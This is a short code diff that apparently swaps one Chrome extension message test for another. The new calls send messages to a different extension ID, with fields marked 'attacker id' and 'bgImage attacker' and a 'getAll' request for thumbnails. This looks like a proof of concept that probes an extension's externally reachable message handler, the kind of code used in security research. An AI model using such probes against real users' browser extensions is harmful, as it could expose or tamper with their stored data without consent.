@@ -1,1 +1,2 @@
-chrome.runtime.sendMessage("impmcgoneickahimkopdfaghfialjakd", {action:"install_collection", slug:"slug", collection:"collection"}, null, function(res){console.log(res)});
+// chrome.runtime.sendMessage("cefodghgahhgomabocmlodpkldhkhipl", {regard:"thumbnails", issue:"exists", bookmark:{id:"attacker id"}, thumb:{bgImage:"bgImage attacker"}}, function(msg){console.log(msg)})
+chrome.runtime.sendMessage("cefodghgahhgomabocmlodpkldhkhipl", {regard:"thumbnails", issue:"getAll", bookmark:{id:"attacker id"}, thumb:{bgImage:"bgImage attacker"}}, function(msg){console.log(msg)})
